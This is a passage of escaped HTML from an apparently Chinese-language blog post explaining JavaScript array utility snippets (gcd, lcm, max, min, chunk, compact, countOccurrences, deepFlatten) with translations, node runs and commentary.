class=\"heading\"\u003earrayGcd\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCalculates the greatest common denominator (gcd) of an array of numbers.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eArray.reduce()\u003c/code\u003e and the \u003ccode\u003egcd\u003c/code\u003e formula (uses recursion) to calculate the greatest common denominator of an array of numbers.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e arrayGcd = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e gcd = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ex, y\u003c/span\u003e) =\u0026gt;\u003c/span\u003e !y ? x : gcd(y, x % y);\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e arr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea,b\u003c/span\u003e) =\u0026gt;\u003c/span\u003e gcd(a,b));\n}\n\u003cspan class=\"hljs-comment\"\u003e// arrayGcd([1,2,3,4,5]) -\u0026gt; 1\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// arrayGcd([4,8,12]) -\u0026gt; 4\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e计算数组的最大公约数。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eArray.reduce()\u003c/code\u003e和\u003ccode\u003egcd\u003c/code\u003e公式(使用递归)来计算一个数组的最大公约数。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat arrayGcd.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e arrayGcd = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e gcd = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ex, y\u003c/span\u003e) =\u0026gt;\u003c/span\u003e !y ? x : gcd(y, x % y);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e arr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, b\u003c/span\u003e) =\u0026gt;\u003c/span\u003e gcd(a, b));\n}\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(arrayGcd([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e]));\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(arrayGcd([\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e]));\n➜  code node arrayGcd.js\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003egcd\u003c/code\u003e即欧几里德算法，具体不表，自查。这里用到了数组的reduce方法，相当简洁，reduce不太了解的话，看下\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce\"\u003emdn\u003c/a\u003e就明白。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003earrayLcm\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCalculates the lowest common multiple (lcm) of an array of numbers.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eArray.reduce()\u003c/code\u003e and the \u003ccode\u003elcm\u003c/code\u003e formula (uses recursion) to calculate the lowest common multiple of an array of numbers.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e arrayLcm = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e{\n \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e gcd = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ex, y\u003c/span\u003e) =\u0026gt;\u003c/span\u003e !y ? x : gcd(y, x % y);\n \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e lcm = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ex, y\u003c/span\u003e) =\u0026gt;\u003c/span\u003e (x*y)/gcd(x, y) \n \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e arr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea,b\u003c/span\u003e) =\u0026gt;\u003c/span\u003e lcm(a,b));\n}\n\u003cspan class=\"hljs-comment\"\u003e// arrayLcm([1,2,3,4,5]) -\u0026gt; 60\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// arrayLcm([4,8,12]) -\u0026gt; 24\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e计算一个数组的最小公倍数。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eArray.reduce()\u003c/code\u003e和\u003ccode\u003elcm\u003c/code\u003e公式(使用递归)来计算一个数组的最大公约数。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat arrayLcm.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e arrayLcm = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e gcd = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ex, y\u003c/span\u003e) =\u0026gt;\u003c/span\u003e (!y ? x : gcd(y, x % y));\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e lcm = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ex, y\u003c/span\u003e) =\u0026gt;\u003c/span\u003e x * y / gcd(x, y);\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e arr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, b\u003c/span\u003e) =\u0026gt;\u003c/span\u003e lcm(a, b));\n};\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(arrayLcm([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e]));\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(arrayLcm([\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e]));\n➜  code node arrayLcm.js\n\u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003elcm\u003c/code\u003e算法用到了前面的\u003ccode\u003egcd\u003c/code\u003e算法，关键点是两个数的最大公约数和最小公倍数的乘积正好就是这两个数的乘积。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003earrayMax\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eReturns the maximum value in an array.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eMath.max()\u003c/code\u003e combined with the spread operator (\u003ccode\u003e...\u003c/code\u003e) to get the maximum value in the array.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst arrayMax = arr =\u0026gt; Math.max(...arr);\n// arrayMax([10, 1, 5]) -\u0026gt; 10\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e返回数组中最大的值。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eMath.max()\u003c/code\u003e和\u003ccode\u003eES6\u003c/code\u003e的扩展运算符\u003ccode\u003e…\u003c/code\u003e返回数组中最大的值。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat arrayMax.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e arrayMax = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.max(...arr);\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(arrayMax([\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e]));\n➜  code node arrayMax.js\n\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e实际上就是\u003ccode\u003eMath.max()\u003c/code\u003e干的事，没啥可说的了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003earrayMin\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eReturns the minimum value in an array.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eMath.min()\u003c/code\u003e combined with the spread operator (\u003ccode\u003e...\u003c/code\u003e) to get the minimum value in the array.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst arrayM\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e = arr =\u0026gt; Math.min(...arr);\n// arrayM\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e([10, 1, 5]) -\u0026gt; 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e返回数组中最小的值。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eMath.min()\u003c/code\u003e和\u003ccode\u003eES6\u003c/code\u003e的扩展运算符\u003ccode\u003e…\u003c/code\u003e返回数组中最小的值。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat arrayMin.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e arrayMin = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.min(...arr);\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(arrayMin([\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e]));\n➜  code node arrayMin.js\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e实际上就是\u003ccode\u003eMath.min()\u003c/code\u003e干的事，没啥可说的了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003echunk\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eChunks an array into smaller arrays of a specified size.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eArray.from()\u003c/code\u003e to create a new array, that fits the number of chunks that will be produced. Use \u003ccode\u003eArray.slice()\u003c/code\u003e to map each element of the new array to a chunk the length of \u003ccode\u003esize\u003c/code\u003e. If the original array can't be split evenly, the final chunk will contain the remaining elements.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e chunk = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003earr, size\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.from({\u003cspan class=\"hljs-attr\"\u003elength\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.ceil(arr.length / size)}, (v, i) =\u0026gt; arr.slice(i * size, i * size + size));\n\u003cspan class=\"hljs-comment\"\u003e// chunk([1,2,3,4,5], 2) -\u0026gt; [[1,2],[3,4],[5]]\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e按照给定的\u003ccode\u003esize\u003c/code\u003e将一个数组切分成含有\u003ccode\u003esize\u003c/code\u003e个数的更小数组块的数组。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eArray.from()\u003c/code\u003e生产新的符合定义的数组。使用\u003ccode\u003eArray.slice()\u003c/code\u003e来截取指定\u003ccode\u003esize\u003c/code\u003e个元素组成新的数组块。如果原数组长度不能被\u003ccode\u003esize\u003c/code\u003e整除，最后的剩余的那些元素将归属于最后一个块。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat chunk.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e chunk = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003earr, size\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.from({ \u003cspan class=\"hljs-attr\"\u003elength\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.ceil(arr.length / size) }, (v, i) =\u0026gt;\n    arr.slice(i * size, i * size + size)\n  );\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(chunk([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e], \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e));\n➜  code node chunk.js\n[ [ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e ], [ \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e ], [ \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e ] ]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/from\"\u003e\u003ccode\u003eArray.from(arrayLike, mapFn, thisArg)\u003c/code\u003e\u003c/a\u003e这个方法呢，第一个参数是一个类数组或者可迭代的对象，第二个参数是一个应用在每一个数组元素上的方法，第三个参数就是改变\u003ccode\u003ethis\u003c/code\u003e的指向了。通俗说就是指定谁是你的爸爸。\u003c/p\u003e\n\u003cp\u003e这里用了一个\u003ccode\u003e{ length: Math.ceil(arr.length / size) }\u003c/code\u003e迭代对象，\u003ccode\u003elength\u003c/code\u003e指定了迭代次数，它正好按照\u003ccode\u003esize\u003c/code\u003e分块后的数组长度正好就是原数组长度除以\u003ccode\u003esize\u003c/code\u003e向上取整的值。向上取整就是为了满足不能完全整除的情况。比如5个元素按照2个进行分块，分了两块两个元素的，剩最后一个元素成了独立块，总共3个元素。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e(v, i)\u003c/code\u003e，由于迭代的时候数组在每一个位置上都是以\u003ccode\u003eundefined\u003c/code\u003e初始化的，所以\u003ccode\u003ev\u003c/code\u003e一直都是\u003ccode\u003eundefined\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003earr.slice(i * size, i * size + size)\u003c/code\u003e迭代过程中每次截取\u003ccode\u003esize\u003c/code\u003e个数的元素组成新数组。这里的\u003ccode\u003ei\u003c/code\u003e就是随着迭代变化，比如\u003ccode\u003elength\u003c/code\u003e是3，\u003ccode\u003ei\u003c/code\u003e就是0，1，2。\u003c/p\u003e\n\u003cp\u003e这里的迭代类似\u003ccode\u003epython\u003c/code\u003e里的\u003ccode\u003erange\u003c/code\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs python\" lang=\"python\"\u003e➜  code python\nPython \u003cspan class=\"hljs-number\"\u003e3.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e (default, Dec \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e)\n[GCC \u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e Compatible Apple LLVM \u003cspan class=\"hljs-number\"\u003e9.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e (clang\u003cspan class=\"hljs-number\"\u003e-900.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.39\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e)] on darwin\nType \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"copyright\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"credits\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"license\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e more information.\n\u003cspan class=\"hljs-meta\"\u003e\u0026gt;\u0026gt;\u0026gt; \u003c/span\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e math\n\u003cspan class=\"hljs-meta\"\u003e\u0026gt;\u0026gt;\u0026gt; \u003c/span\u003earr = [\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e]\n\u003cspan class=\"hljs-meta\"\u003e\u0026gt;\u0026gt;\u0026gt; \u003c/span\u003esize = \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\n\u003cspan class=\"hljs-meta\"\u003e\u0026gt;\u0026gt;\u0026gt; \u003c/span\u003e\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(math.ceil(len(arr) / size)):\n\u003cspan class=\"hljs-meta\"\u003e... \u003c/span\u003e    print(\u003cspan class=\"hljs-string\"\u003e'index: '\u003c/span\u003e, i)\n...\nindex:  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\nindex:  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nindex:  \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003ecompact\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eRemoves falsey values from an array.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eArray.filter()\u003c/code\u003e to filter out falsey values (\u003ccode\u003efalse\u003c/code\u003e, \u003ccode\u003enull\u003c/code\u003e, \u003ccode\u003e0\u003c/code\u003e, \u003ccode\u003e\"\"\u003c/code\u003e, \u003ccode\u003eundefined\u003c/code\u003e, and \u003ccode\u003eNaN\u003c/code\u003e).\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst compact = arr =\u0026gt; arr.filter(Boolean);\n// compact([0, 1, \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e, 2, \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, 3, \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'e'\u003c/span\u003e*23, NaN, \u003cspan class=\"hljs-string\"\u003e's'\u003c/span\u003e, 34]) -\u0026gt; [ 1, 2, 3, \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e's'\u003c/span\u003e, 34 ]\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e移除掉数组里\u003ccode\u003efalsey\u003c/code\u003e的元素。（这个\u003ccode\u003efalsey\u003c/code\u003e不太好翻译，我记得好像不是错误的，应该是该值布尔运算值为\u003ccode\u003efalse\u003c/code\u003e的，我个人常用\u003ccode\u003e!!\u003c/code\u003e进行运算）。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eArray.filter()\u003c/code\u003e把\u003ccode\u003efalse\u003c/code\u003e、\u003ccode\u003enull\u003c/code\u003e、\u003ccode\u003e0\u003c/code\u003e、\u003ccode\u003e\"\"\u003c/code\u003e、\u003ccode\u003eundefined\u003c/code\u003e和\u003ccode\u003eNaN\u003c/code\u003e这些\u003ccode\u003efalsey\u003c/code\u003e过滤掉。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat compact.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e compact = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e arr.filter(\u003cspan class=\"hljs-built_in\"\u003eBoolean\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(compact([\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"e\"\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003eNaN\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"s\"\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e]));\n➜  code node compact.js\n[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e's'\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e ]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter\"\u003e\u003ccode\u003eArray.prototype.filter()\u003c/code\u003e\u003c/a\u003e干的，没啥好说。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003ecountOccurrences\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCounts the occurrences of a value in an array.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eArray.reduce()\u003c/code\u003e to increment a counter each time you encounter the specific value inside the array.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst countOccurrences = (arr, value) =\u0026gt; arr.reduce((a, v) =\u0026gt; v === value ? a + 1 : a + 0, 0);\n// countOccurrences([1,1,2,1,2,3], 1) -\u0026gt; 3\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e统计一个元素在一个数组中出现的次数。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eArray.reduce()\u003c/code\u003e在遍历过程中如果指定元素在数组中出现，则增加它的次数值，默认次数为0。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat countOccurrences.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e countOccurrences = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003earr, value\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n  arr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, v\u003c/span\u003e) =\u0026gt;\u003c/span\u003e (v === value ? a + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e : a + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e), \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(countOccurrences([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e], \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e));\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(countOccurrences([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e], \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e));\n➜  code node countOccurrences.js\n\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e三元运算符\u003ccode\u003e(v === value ? a + 1 : a + 0)\u003c/code\u003e遍历过程中判断遍历数组值\u003ccode\u003ev\u003c/code\u003e是否严格等于指定值\u003ccode\u003evalue\u003c/code\u003e，是，次数\u003ccode\u003ea+1\u003c/code\u003e；否，\u003ccode\u003ea+0\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e最后的一个逗号后面的0，是这个初始值，即\u003ccode\u003ea=0\u003c/code\u003e，这个懂\u003ccode\u003ereduce\u003c/code\u003e方法都知道，特别指出是，因为这个函数一定会有返回值，如果指定元素没有在数组中出现一次，返回值是\u003ccode\u003e0\u003c/code\u003e，所以必须得初始化为\u003ccode\u003e0\u003c/code\u003e。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003edeepFlatten\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eDeep flattens an array.\u003c/p\u003e\n\u003cp\u003eUse recursion. Use \u003ccode\u003eArray.concat()\u003c/code\u003e with an empty array (\u003ccode\u003e[]\u003c/code\u003e) and the spread operator (\u003ccode\u003e...\u003c/code\u003e) to flatten an array. Recursively flatten each element that is an array.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst deepFlatten = arr =\u0026gt; [].concat(...arr.map(v =\u0026gt; Array.isArray(v) ? deepFlatten(v) : v));\n// deepFlatten([1,[2],[[3],4],5]) -\u0026gt; [1,2,3,4,5]\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e深度摊平一个数组。\u003c/p\u003e\n\u003cp\u003e使用递归方法。结合\u003ccode\u003eArray.concat()\u003c/code\u003e、空数组\u003ccode\u003e[]\u003c/code\u003e和\u003ccode\u003eES6\u003c/code\u003e的扩展运算符\u003ccode\u003e…\u003c/code\u003e来摊平一个数组，如果摊平的元素还是一个数组，就再递归运用该方法。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat deepFlatten.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e deepFlatten = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003earr\u003c/span\u003e =\u0026gt;\u003c/span\u003e\n  